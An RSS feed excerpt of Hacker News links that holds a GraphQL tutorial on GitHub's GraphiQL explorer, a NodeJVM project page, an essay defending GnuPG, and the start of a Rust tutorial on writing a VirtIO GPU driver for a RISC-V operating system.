<p>Even with its usability, there are still a few pointers which are helpful to learning GraphQL. GitHub implemented their <a href="https://developer.github.com/v4/">API v4</a> using GraphQL. Let’s work through an example using <a href="https://developer.github.com/v4/explorer/">GitHub’s GraphiQL explorer</a> to hit the GitHub API as a way to learn some basic GraphQL:</p>

<h3 id="graphiql-keyboard-shortcuts">GraphiQL Keyboard Shortcuts</h3>

<p>Before we start, take a look at these keyboard shortcuts I frequently use when working in the GraphiQL IDE:</p>

<ul>
  <li>Auto Complete: Ctrl-Space (or Option-Space)</li>
  <li>Run query: Ctrl-Enter</li>
  <li>Format query: Ctrl-Shift-P</li>
</ul>

<h3 id="githubs-graphiql-explorer">GitHub’s GraphiQL Explorer</h3>

<p>When you open up <a href="https://developer.github.com/v4/explorer/">GitHub’s GraphiQL explorer</a>, you’ll see three panes. The top left is a query editor for our GraphQL query to GitHub’s API; bottom left is for query variables; and the right side will display query results when we hit the API.</p>

<p>After signing in with your GitHub account details, Hit play (Ctrl-Enter) on the query which GitHub autofills! You’ll see your login displayed on the right side of the screen. The first item to note here is that the result mirrors the syntax and format of the query. This is a big part of what makes GraphQL so intuitive! The API responses mirror the API requests.</p>

<h3 id="reading-the-docs">Reading the Docs</h3>

<p>Towards the right of the GraphiQL explorer, there’s a <code>&lt; Docs</code> button. Toggle it! (This is not to be confused with the topbar menu <code>Docs</code> dropdown.) The <code>&lt; Docs</code> will toggle a little interface which tells us what to expect in our queries, and helps us when we use incorrect syntax. It will let us search by type.</p>

<p>Your first question, though, might be, how will we know the type of our data? In GraphQL, we can use <code>__typename</code> on any data to get its type. For instance, we can edit the query we just wrote:</p>

<div><div><pre><code>query <span>{</span>
  viewer <span>{</span>
    __typename
  <span>}</span>
<span>}</span>
</code></pre></div></div>
<p>and we’ll see that <code>viewer</code> has the type <code>"User"</code>. If we now search the docs for <code>"User"</code>, we’ll see there are many <code>"Fields"</code> on user which we can explore. Try adding a few fields to your initial query.</p>

<h3 id="user">User</h3>

<p>Well, there must also be other <code>"User"</code>s we can access instead of just ourselves. Let’s try it! Replace <code>viewer</code> in the query from above with <code>user</code>. When we run this snippet, we’ll see an error:</p>

<div><div><pre><code>query <span>{</span>
  user <span>{</span>
    name
    login
    createdAt
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The error will appear on our right pane. The error message tells us our problem, <code>"Field 'user' is missing required arguments: login"</code> Ah! We haven’t told GraphQL <em>which</em> user we’re interested in. As it suggests, let’s pass in a user’s login. <a href="https://github.com/torvalds">Linus Torvalds</a> created git, so he seems like an appropriate user to play with. His login is <code>torvalds</code>:</p>

<div><div><pre><code>query <span>{</span>
  user<span>(</span>login: <span>"torvalds"</span><span>)</span> <span>{</span>
    name
    login
    createdAt
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Neat. On the right side of your screen you should see that he’s had a GitHub account since 2011.</p>

<h3 id="connections">Connections</h3>

<p>When looking at the <code>User</code> docs, you might have noticed a type suffixed with <code>"Connection"</code>, for instance, <code>followers</code> has type <code>"FollowerConnection"</code>.</p>

<p>In GraphQL, <code>User</code> is a <code>Node</code>. Nodes have edges, and lists of these edges are called <code>Connections</code>. A <code>Connection</code> is a way to see all nodes that are connected to a certain node in a specific way. In our case, we’re looking for all <code>followers</code> nodes which are connected to Linus Torvalds. (See <a href="https://www.apollographql.com/blog/explaining-graphql-connections-c48b7c3d6976/">this Apollo blog post</a> for further reading about connections.)</p>

<p>If we try typing <code>followers</code> in the query, GraphiQL will give us an indication of an error. Hovering, we can read the error message, saying that <code>followers</code> must have a selection of subfields. This is where GraphiQL is incredibly helpful. Hit run (Ctrl-enter) after typing <code>followers</code>, and GraphiQL will autocomplete what its asking for:</p>

<div><div><pre><code>query <span>{</span>
  user<span>(</span>login: <span>"torvalds"</span><span>)</span> <span>{</span>
    name
    login
    createdAt
    followers <span>{</span>
      edges <span>{</span>
        node <span>{</span>
          <span>id</span>
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>GraphiQL has auto-filled in the <code>edges</code>, <code>node</code> and <code>id</code> field on <code>followers</code> as defaults to give us some data about Linus’ followers. This makes sense given what we know about edges and nodes: followers has <code>edges</code> and each of these is a <code>node</code>.</p>

<p>But, if we look to the right side of our screen, we’ll see we have an error instead of results. The type <code>"MISSING_PAGINATION_BOUNDARIES"</code> and message <code>"You must provide a 'first' or 'last' value to properly paginate the 'followers' connection."</code> are both helpful here.</p>

<p>One of GraphQL’s real features is that it never returns more data than you ask it for. That said, we must tell it exactly how much data we want, by using (as prompted), the <code>first</code> or <code>last</code> field to limit the number of followers we’re asking for. Let’s look at Linus’ last 5 followers:</p>

<div><div><pre><code>query <span>{</span>
  user<span>(</span>login: <span>"torvalds"</span><span>)</span> <span>{</span>
    name
    login
    createdAt
    followers<span>(</span>last: 5<span>)</span> <span>{</span>
      edges <span>{</span>
        node <span>{</span>
          <span>id</span>
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This worked! But the <code>id</code>s aren’t particularly informative. We can see the type of <code>followers</code> by again using <code>__typename</code>. Or, we can use Ctrl-space to autoprompt some fields we might be interested in. Instead of the <code>id</code> field on a <code>node</code>, let’s look at <code>name</code>:</p>

<div><div><pre><code>query <span>{</span>
  user<span>(</span>login: <span>"torvalds"</span><span>)</span> <span>{</span>
    name
    login
    createdAt
    followers<span>(</span>last: 5<span>)</span> <span>{</span>
      edges <span>{</span>
        node <span>{</span>
          name
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Aha, we can see the name of a few of Linus’ followers. But, exactly how popular is he? For that, we can use the <code>totalCount</code> field under <code>followers</code>:</p>

<div><div><pre><code>query <span>{</span>
  user<span>(</span>login: <span>"torvalds"</span><span>)</span> <span>{</span>
    name
    login
    createdAt
    followers<span>(</span>last: 5<span>)</span> <span>{</span>
      totalCount
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>As of the writing of this post, he has 124,812 followers. Notably, <code>totalCount</code> was <em>not</em> limited by our pagination. This is because it is only returning a single value, not a series of values.</p>

<h3 id="query-variables">Query Variables</h3>

<p>Reading this, you might have been curious how many followers a different user has. For that, we could replace <code>"torvalds"</code> with a different user’s login. Or, we could learn about Query Variables!</p>

<p>This is the last remaining pane (on the bottom left) which we haven’t touched yet.</p>

<p>We first need to declare the argument within our query. GraphQL requires a type here. We’ll need to declare it in two places. The first is passing it into the query itself. The syntax is <code>query ($variable_name:type!) { ...</code> In our case, we want to pass a <code>login</code> of type <code>String</code>, so <code>query ($login:String!) {...</code>. Secondly, we want this to be our user’s login. So we can replace <code>torvalds</code> with <code>$login</code> as follows:</p>

<div><div><pre><code>query <span>(</span><span>$login</span>:String!<span>)</span> <span>{</span>
  user<span>(</span>login: <span>$login</span><span>)</span> <span>{</span>
    name
    followers<span>(</span>last: 5<span>)</span> <span>{</span>
     totalCount
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>If we run this, our error message tells us that <code>"Variable $login of type String! was provided invalid value"</code>! Ah! We still didn’t use our bottom left “Query Variables” pane. Let’s fill it in. Again, we can use the Ctrl-space to help us out: <code>{"login": "jemmaissroff"}</code>. If we now hit run, we’ll see (among other things) that I have <em>significantly</em> fewer followers than Linus Torvalds.</p>

<h3 id="tldr">TL;DR</h3>

<p>For those short on time or attention:</p>

<ul>
  <li>GraphQL query results mirror JSON, making them easy to parse, write and reason about</li>
  <li><a href="https://github.com/graphql/graphiql">GraphiQL</a> is a helpful GraphQL IDE</li>
  <li><code>__typename</code> gives the type of an item, helpful for reading the docs</li>
  <li>Some queries have required arguments to limit the scope of a search, like <code>login</code> for user</li>
  <li>Pagination is a feature of GraphQL, requiring us to limit our queries, sometimes using <code>first</code> or <code>last</code></li>
  <li>Query variables must have a type and be named in the query declaration</li>
  <li>Query variables then can be used throughout the query itself by referencing the name in the declaration</li>
</ul>

<p>For an example of a queries which uses a few additional features of GraphQL, check out the queries I wrote <a href="https://github.com/jemmaissroff/find_github_email/blob/main/lib/find_github_email/queries.rb">here</a> for a Ruby gem to <a href="https://github.com/jemmaissroff/find_github_email">find GitHub users’ emails</a>.</p>


  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://jemma.dev/blog/executing-graphql-queries</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058361</guid>
            <pubDate>Wed, 11 Nov 2020 13:50:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NodeJVM]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058252">thread link</a>) | @mooreds
<br/>
November 11, 2020 | https://mikehearn.github.io/nodejvm/ | <a href="https://web.archive.org/web/*/https://mikehearn.github.io/nodejvm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        
      
      
      <main role="main">
        <div data-md-component="container">
          
            
              
            
            
              
            
          
          <div>
            <article>
              
                
                  <a href="https://github.com/mikehearn/nodejvm/edit/master/docs/index.md" title="Edit this page"></a>
                
                
                
<p>This repository demonstrates how to use NodeJS/npm modules directly from Java and Kotlin. Why is it useful:</p>
<ul>
<li>Gain access to unique JavaScript modules, like the Dat peer to peer file sharing framework shown in the samples.</li>
<li>Combine your existing NodeJS and Java servers together, eliminating the overheads of REST, serialisation, two separate
  virtual machines. Simplify your microservices architecture into being a polyglot architecture instead.</li>
<li>Use it to start porting NodeJS apps to the JVM world and languages, incrementally, one chunk at a time, whilst always
  having a runnable app. Or do the reverse.</li>
</ul>
<h2 id="how-does-it-work">How does it work?<a href="#how-does-it-work" title="Permanent link">¶</a></h2>
<p><a href="https://www.graalvm.org/">GraalVM</a> is a modified version of OpenJDK that includes the cutting edge Graal and Truffle compiler infrastructure.
It provides an advanced JavaScript engine that has competitive performance with V8, and also a modified version of
NodeJS 10 that swaps out V8 for this enhanced JVM. In this way you can fuse together NodeJS and the JVM, allowing apps
to smoothly access both worlds simultaneously with full JIT compilation.</p>
<h2 id="known-limitations">Known limitations<a href="#known-limitations" title="Permanent link">¶</a></h2>
<p>NodeJS really wants to load module files from the filesystem and nowhere else, so your Java app will need a <code>node_modules</code>
directory from where it's started. There are tricks to work around this and allow bundling of JS into JAR files as
libraries, but nothing done at the moment.</p>
<p>GraalVM uses NodeJS 10, not the latest versions.</p>
<p>You change <code>java</code> on the command line to <code>nodejvm</code> and that's all it needs, but many tools and IDEs expect the java
launcher to always be called <code>java</code>.  </p>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        

      
    </div></div>]]>
            </description>
            <link>https://mikehearn.github.io/nodejvm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058252</guid>
            <pubDate>Wed, 11 Nov 2020 13:36:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Defense of GnuPG]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058064">thread link</a>) | @m3rcury
<br/>
November 11, 2020 | https://www.oyd.org.tr/en/articles/defense-of-gpg/ | <a href="https://web.archive.org/web/*/https://www.oyd.org.tr/en/articles/defense-of-gpg/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">
  <article>
    
     
      
    <p>For several years, there has been an uprasing against GPG. Every now and then someone writes up a blog post and condemn OpenPGP and it’s implementations for being too hard to use or too easy to mess up. The GPG side is mostly silent. So, this article is in defence of GPG.</p>
<p>Main points made against GPG can be listed like this:</p>
<ol start="0">
<li>GPG is too complicated for “normal” users</li>
<li>Because GPG is too complicated, it’s userbase is minuscule</li>
<li>Email is inherently impossible to secure so don’t even bother encrypting it. Just abandon GPG</li>
<li>Nobody bothers to read emails of “normal” people so don’t encrypt</li>
<li>TLS has done much more for email security than GPG</li>
<li>GPG is error prone and security wise it is dangerous for people to use it when actual security is needed</li>
<li>For various reasons, only cryptonerds use it and take pride on GPG so it is lame</li>
<li>GPG’s trust model (web of trust) is broken and only cryptonerds are keeping it alive</li>
<li>GPG is old</li>
<li>There are better [insert anything involving app like crypto tool] why bother with GPG</li>
<li>GPG crypto has [Insert any long term RSA based cryptography’s short comings and trust problems] why not use modern crypto</li>
</ol>
<p>During these discussion, these point are mostly assumed to be true;</p>
<ol start="0">
<li>People are stupid and lazy so are the users of encryption tools</li>
<li>Since users are stupid and lazy tools should be designed keeping that in mind</li>
<li>Designing for stupid and lazy requires stripping people from anything than needed(i.e freedom)</li>
<li>If security is not absolute it is worthless</li>
<li>If privacy is not absolute, anonymity is worthless</li>
<li>If your adversary cannot compromise  of your security then there is no need for GPG even for privacy</li>
</ol>
<h2 id="whats-the-problem">What’s The Problem</h2>
<p>We name periods of human history by their defining property. That property is mainly what drives human society and culture at that current age. The iron age was shaped by the superiority of iron as a material for weapons and agricultural tools. Today’s digitally shaped age is called <a href="https://www.schneier.com/essays/archives/2012/11/when_it_comes_to_sec.html">digital feudalism</a> and it governs our lives. Just like regular feudalism the resources of society is controlled by few, generated by many and the feudal lords of ours claim their right to their thrones through their infrastructure.</p>
<p>We as users are fueling the rise of the digital technologies but handful of companies are controlling and profiting from it. Just like peasants of the middle ages, you are seen as basic people who cannot understand the complex life that only a few selected elites can. It is what you are asusmed to be: simple people who wants simple things, like “apps” that will give you what you assumed to need and nothing more. It is the same old condescending view of serfs, now given to you by companies, ignorant and arrogant developers and overall by capitalism.</p>
<p>Today saying “what do I understand about computers” is equivalent to saying “I don’t know how to light a fire” in stone age! Just because someone might be feeding you back in those days did not mean that you could survive on your own. The same applies to current digital age. Just because someone is doing <strong>stuff</strong> for you does not ensure your digital survival. There was no easy way to light a fire back then and there will be no “press this button” easy way to take back the power in the digital age. Whoever claims people <strong>want</strong> or <strong>need</strong> only simple stupid apps and whoever denies the fact that we are living in digital feudalism are building a dystopian future where few elite unprecedentedly controls the future. Self determination is never given by anyone but can only be taken by everyone!</p>
<p>This ideology that “people are stupid” and “people want easy(read:stupid)” things dominates today’s end user software development. Good UX does not equal to simple. The real meaning in these expressions is: “you are too stupid to take responsibility for your self and to understand what’s going on, so we as technological elites will take care of you”. This is what’s the base of almost all GPG related criticism. GPG is too hard for people!</p>
<p>PGP, the preceder of GPG, was conceived in 1991 and this era was shaped by hackers. Not the hackers that main stream media shows in black hoods and authorities around the world paint as people with no moral boundaries. Hackers are the people who playfully expanded what is available to what is possible. This attitude brought general public; personal computers, GNU/Linux operating system that are now powering almost every backbone in the world, 3D printers etc. PGP was shaped by the empowerment of that era, not the “there is an app for that” era of today which is shaped by multi-billion dollar cooperation built upon the cultural and technological accumulation of hackers.</p>
<p>That brings us to the point: GPG is hard for people, but so were the general purpose computers around 20 years ago. Everything requires individual dedication and determination to learn and maintain. What happened with computers is that some people capitalised on the opportunity, poured money into devices and after hundreds of hours long R&amp;D those computers became “easy”. The outcome of that process was loss of the right to fix, more enclosed and restricted user environments and computers that works against us! So those who invested in computers can profit from their investment.</p>
<p>The same problem also exists for encryption. There was no real incentive for capitalists to invest in publicly accessible encryption. Solid encryption would make reaching data possible only for the user who owns it and this would be counter intuitive to the interest of capitalism. But today there is an incentive: people are afraid of what our digital world has become. They are afraid of their <a href="https://en.wikipedia.org/wiki/Global_surveillance_disclosures_(2013%E2%80%93present)">government’s abuse of power</a>, they are afraid of <a href="https://www.theguardian.com/technology/2017/sep/26/tinder-personal-data-dating-app-messages-hacked-sold">companies taking advantage of their lives</a>, they are afraid that their <a href="https://en.wikipedia.org/wiki/Facebook%E2%80%93Cambridge_Analytica_data_scandal">involment in democracy will be lost</a>. People are afraid and there is no better time to sell something. That’s why Apple is now selling <a href="https://en.wikipedia.org/wiki/FBI%E2%80%93Apple_encryption_dispute">privacy as a product</a> and that is why every communication service regardless their privacy invasive tendencies are <a href="https://faq.whatsapp.com/en/android/28030015/">promoting encryption</a>. What is missing is that people are still an object in this case. Whoever holds the key holds the future and there is no alternative to GPG that gives the user the best self determination!</p>
<p>So, how is GPG doing while the craze to own next killer encryption app continiue? <a href="https://en.wikipedia.org/wiki/Werner_Koch"><strong>Werner Koch</strong></a>, is the single person maintaining GPG. He was almost about to give up on GPG for <a href="https://www.propublica.org/article/the-worlds-email-encryption-software-relies-on-one-guy-who-is-going-broke">economic reasons</a> when the <a href="https://en.wikipedia.org/wiki/Edward_Snowden">Snowden incident</a> has chanced his decision. The world’s whole server infrastructure security and personal freedom rests on his shoulder and he had to ask for help. It is a huge difference in investment/impact ratio when compared to every other encryption tool. GPG exist by determination and not through capital pressure.</p>
<p>In every “GPG is dead” cry almost always includes some <strong>killer</strong> new technology that makes more <strong>sense</strong> than GPG. Let’s talk about them for a while.</p>
<h2 id="signal">Signal</h2>
<p>A big hit in secure instant messaging. Signal is build upon proprietary software Textsecure and RedPhone that had been once developed by <a href="https://en.wikipedia.org/wiki/Moxie_Marlinspike">Moxie Merlinspike</a> and his co-founder Stuart Anderson. Signal Protocol utilizing <a href="https://en.wikipedia.org/wiki/Double_Ratchet_Algorithm">double ratchet</a> encryption is a game changer for modern connectivity and implemented in [several applications[(https://signal.org/blog/whatsapp-complete/). Signal applications and server code is free software but <a href="https://oyd.org.tr/en/articles/stop-saying-freedom-is-a-private-matter/">their developers and business model is not</a>. It is <a href="#https://matrix.org/blog/2020/01/02/on-privacy-versus-freedom/">yet another walled garden with no federation</a> and <a href="https://moxie.org/blog/gpg-and-me/">claiming GPG is dead</a>.</p>
<h2 id="matrix-protocol">Matrix Protocol</h2>
<p><a href="https://en.wikipedia.org/wiki/Matrix_(protocol)">Matrix protocol</a> is an open standard for general communication needs. Like <a href="https://en.wikipedia.org/wiki/Xmpp">XMPP -Extensible Messaging and Presence Protocol-</a> it is designed to be implemented widely and serve various modern needs of communication. End-to-end encryption is falling behind and there are still implementation problems but if everything goes well Matrix Protocol could be a modern free future for communication. The only problem is that Matrix Protocol is still an instant communication system and the cryptography behind it is specialized only for that purpose.</p>
<h2 id="insert-any-app-or-protocol">[Insert Any App or Protocol]</h2>
<p>Almost all have some of these short comings:</p>
<ul>
<li>Walled Gardens with no federation</li>
<li>Non-free dependencies</li>
<li>Single purpose</li>
<li>Symmetrical communication while e-mail being asymmetrical</li>
<li>Opaque key generation and management</li>
</ul>
<p>Modern messaging softwares do have merits that are desirable such as <a href="https://en.wikipedia.org/wiki/Forward_secrecy">forward secrecy</a>, <a href="https://en.wikipedia.org/wiki/Elliptic_curve_cryptography">recent algorithms with shorter keys</a>(read: not necessarily more secure) and more frictionless key management(which heavily depends on central key servers and personal data). All these merits are, to some degree, desireable for GPG too but those tool’s have different design requirements than GPG. GPG can and will become better at most points. When the case is single person against a multi-billion dollar industry, this should not count as a fair trial.</p>
<p>What GPG is offering in exchange is <strong>freedom</strong>, not just another “app” that walls it’s users in and here is why:</p>
<h2 id="gpg-giving-you-the-total-control-of-your-key-and-identity">GPG giving you the TOTAL control of your key and identity</h2>
<p>This primary point is so important, the rest seems moot. GPG is the most liberating piece of software EVER. What GPG is capable of and how it is implemented almost always secondary to the fact that <strong>you</strong> as the user in need of cryptography <strong>control</strong> the key. You can export it, expand it, change it, renew it, <a href="https://github.com/intra2net/paperbackup">print it on paper</a>, revoke it. The fact that you own and control your key actually makes it possible for you to build your identity around that key. This is almost like being your own certificate authority and issuing your certificates as you please.</p>
<p>This comes with the trust problem of cryptopgraphy. If anyone can generate a key with any metadata, then who is deciding on a particular key belong to an individual. The answer is <strong>no one</strong> and <strong>everyone</strong>. <a href="https://en.wikipedia.org/wiki/Web_of_trust">Web of trust</a> is an answer to this question for most part. You basically sign keys of people who you know and the people who trust you, trusts your friends.</p>
<p>This implementation is <a href="https://web.archive.org/web/20131009142806/https://www.rubygems-openpgp-ca.org/blog/theres-trust-and-then-theres-trust-and-then-theres-trust.html">considered broken</a> by a lot of people and there is a natural down side of making your social network public. That being said building trust …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.oyd.org.tr/en/articles/defense-of-gpg/">https://www.oyd.org.tr/en/articles/defense-of-gpg/</a></em></p>]]>
            </description>
            <link>https://www.oyd.org.tr/en/articles/defense-of-gpg/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058064</guid>
            <pubDate>Wed, 11 Nov 2020 13:14:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Graphical Output from Our Custom RISC-V Operating System in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058039">thread link</a>) | @pavehawk2007
<br/>
November 11, 2020 | https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/ | <a href="https://web.archive.org/web/*/https://blog.stephenmarz.com/2020/11/11/risc-v-os-using-rust-graphics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								
								<div>
									
<p>An operating system is used to make our job easier when using graphics. In our instance, in addition to everything else. In this post, we will be writing a GPU (graphics processing unit) driver using the VirtIO specification. In here, we will allow user applications to have a portion of the screen as RAM–with what is commonly known as a <em>framebuffer</em>.</p>



<hr>



<h2>Contents</h2>



<ol><li><a href="#overview">Overview</a></li><li><a href="#pixels">Pixels and Resolution</a></li><li><a href="#virtio">The GPU VirtIO Device</a></li><li><a href="#init">Initialization</a></li><li><a href="#invalid">Invalidation and Transfer</a></li><li><a href="#response">Device Responses</a></li><li><a href="#user">User Space</a></li><li><a href="#api">Simple Graphics API</a></li><li><a href="#conclusion">Conclusions and Further Reading</a></li></ol>



<hr>



<h2 id="overview">Overview</h2>



<p>We command the virtual GPU (virtio-gpu) by sending certain commands to the host (the device). The guest (the OS driver) has an allocation of RAM that becomes the framebuffer. The driver then tells the device, “hey, here’s the RAM that we’re going to use to store pixel information.”</p>



<p>The RAM is contiguous in our OS, but according to the specification, this isn’t strictly required. We will give the driver a rectangle. Everything that falls within that rectangle will be copied to the host. We don’t want to keep copying the entire buffer over and over again.</p>



<p>We will be using the virtio protocol that we used for the block driver here, so I won’t rehash the general virtio protocol. However, the device-specific structures are a bit different, so we’ll cover that part more in depth.</p>



<hr>



<h2 id="pixels">Pixels and Resolution</h2>



<p>A framebuffer must be large enough to store \(\text{width}\times\text{height}\times\text{pixel size}\) number of bytes. There are \(\text{width}\times\text{height}\) number of pixels. Each pixel has a 1-byte red, green, blue, and alpha channels. So, each pixel is exactly 4 bytes with the configuration we’re going to specify.</p>



<p>The framebuffer for our junior GPU driver is going to support a fixed resolution of \(640\times 480\). If you’re a child of the 90s, you saw this resolution a lot. In fact, my first computer, a Laser Pal 386, had a 16-color monitor with a resolution of 640 pixels wide with 480 pixels tall.</p>



<div><figure><a href="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13.png"><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13.png" alt="" width="458" height="281" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13.png 611w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-13-300x184.png 300w" sizes="(max-width: 458px) 100vw, 458px"></a></figure></div>



<p>There are red, green, and blue pixels so close together that by varying the intensity of these three channels, we can change the color. The closer we get to our monitors, the easier a pixel is to see.</p>



<div><figure><a href="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14.png"><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14.png" alt="" width="285" height="288" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14.png 380w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-14-297x300.png 297w" sizes="(max-width: 285px) 100vw, 285px"></a><figcaption>Pixels on a Viewsonic VX2770SMH-LED monitor.</figcaption></figure></div>



<p>You can see these little squares. If you squint enough, you can see that they aren’t pure white. Instead, you can see bits of red, blue, and green. That’s because each one of these little squares is subdivided into three colors: yep, red, green, and blue! To make white, these pixels are turned up to 11 (get the joke?). To make black, we turn off all three channels of that pixel.</p>



<p>The resolution refers to how many of these squares are on our monitor. This is a 1920×1080 monitor. That means that there are 1920 of these squares going left to right, and there are 1080 of these squares from top to bottom. All in all, we have \(1920\times 1080=2,073,600\) number of pixels. Each one of these pixels is expressed using 4 bytes in the framebuffer, meaning we need \(2,073,600\times 4=8,294,400\) bytes in RAM to store the pixel information.</p>



<p>You can see why I limited our resolution to 640×480, which only requires \(640\times 480\times 4=1,228,800\) bytes–a bit over a megabyte.</p>



<hr>



<h2 id="virtio">The GPU VirtIO Device</h2>



<p>The GPU device requires us to read a more up-to-date VirtIO specification. I’ll be reading from version 1.1, which you can get a copy here: <a href="https://docs.oasis-open.org/virtio/virtio/v1.1/virtio-v1.1.html">https://docs.oasis-open.org/virtio/virtio/v1.1/virtio-v1.1.html</a>. Specifically, chapter 5.7 “GPU Device”. This is an <em>unaccelerated</em> 2D device, meaning that we must use the CPU to actually form the framebuffer, then we transfer our CPU formulated memory location to the host GPU, which is then responsible for drawing it to the screen.</p>



<p>The device uses a request/response system, where we the driver make a command to request something from the host (the GPU).  We add a bit of extra memory into our request so that the host can formulate its response. When the GPU interrupts us, we can take a look at this response memory location to see what the GPU told us. This is much like the <em>status</em> field on the block driver, where the block device tells us the status of our last request.</p>



<p>Each request starts with a <em>Command Header</em>, which in Rust looks as follows:</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(C)]
struct CtrlHeader {
	ctrl_type: CtrlType,
	flags: u32,
	fence_id: u64,
	ctx_id: u32,
	padding: u32
}</pre>



<p>The header is common for all requests and all responses. We can differentiate by the CtrlType enumeration, which is:</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(u32)]
enum CtrlType {
	/* 2d commands */
	CmdGetDisplayInfo = 0x0100,
	CmdResourceCreate2d,
	CmdResourceUref,
	CmdSetScanout,
	CmdResourceFlush,
	CmdTransferToHost2d,
	CmdResourceAttachBacking,
	CmdResourceDetachBacking,
	CmdGetCapsetInfo,
	CmdGetCapset,
	CmdGetEdid,
	/* cursor commands */
	CmdUpdateCursor = 0x0300,
	CmdMoveCursor,
	/* success responses */
	RespOkNoData = 0x1100,
	RespOkDisplayInfo,
	RespOkCapsetInfo,
	RespOkCapset,
	RespOkEdid,
	/* error responses */
	RespErrUnspec = 0x1200,
	RespErrOutOfMemory,
	RespErrInvalidScanoutId,
	RespErrInvalidResourceId,
	RespErrInvalidContextId,
	RespErrInvalidParameter,
}</pre>



<p>I took this directly from the specification, but Rust-ified the names to avoid getting yelled at by the linter.</p>



<h3>Pixel Formats</h3>



<p>Recall that the framebuffer is just a bunch of bytes in memory. We need to put a structure behind the framebuffer so the host (the GPU) knows how to interpret your sequence of bytes. There are several formats, but all-in-all, they just re-arrange the red, green, blue, and alpha channels. All are exactly 4 bytes, which makes the <em>stride</em> the same. The stride is the spacing from one pixel to another–4 bytes.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(u32)]
enum Formats {
	B8G8R8A8Unorm = 1,
	B8G8R8X8Unorm = 2,
	A8R8G8B8Unorm = 3,
	X8R8G8B8Unorm = 4,
	R8G8B8A8Unorm = 67,
	X8B8G8R8Unorm = 68,
	A8B8G8R8Unorm = 121,
	R8G8B8X8Unorm = 134,
}</pre>



<p>The type, <em>unorm</em>, is an 8-bit (1-byte) unsigned value from 0 through 255, where 0 represents no intensity and 255 represents full intensity, and a number in between is a linear-interpolation between no and full intensity. Since there are three color (and one alpha), that gives us \(256\times 256\times 256=16,776,216\) different colors or levels of colors.</p>



<p>For this tutorial, I selected <code>R8G8B8A8Unorm = 67</code>, which has red first, green second, blue third, and alpha fourth. This is a common ordering, so I’ll select it to make it easy to follow along.</p>



<p>Our selected format makes the pixel structure look as follows:</p>



<div><figure><a href="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21.png"><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-1024x614.png" alt="" width="512" height="307" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-1024x614.png 1024w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-300x180.png 300w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-768x461.png 768w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-1536x921.png 1536w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-21-2048x1228.png 2048w" sizes="(max-width: 512px) 100vw, 512px"></a></figure></div>



<p>Recall that each individual component R, G, B, and A are each one byte a piece, so each Pixel referred to by (x, y) is 4 bytes. This is why our memory pointer is a Pixel structure instead of a byte.</p>



<hr>



<h2 id="init">Initialization</h2>



<p>Just like all other virtio devices, we set up the virtqueues first and then we work on device-specific initialization. In my code, I just directly copied-and-pasted from the block driver into the gpu driver. The only thing I added to the Device structure was the framebuffer and dimensions of the framebuffer.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">pub struct Device {
	queue:        *mut Queue,
	dev:          *mut u32,
	idx:          u16,
	ack_used_idx: u16,
	framebuffer:  *mut Pixel,
	width:        u32,
	height:       u32,
}</pre>



<p>The specification tells us to do the following in order to initialize the device and get things ready to draw. I Rust-ified some of the content to match our enumerations.</p>



<h4>Create a framebuffer and configure scanout</h4>



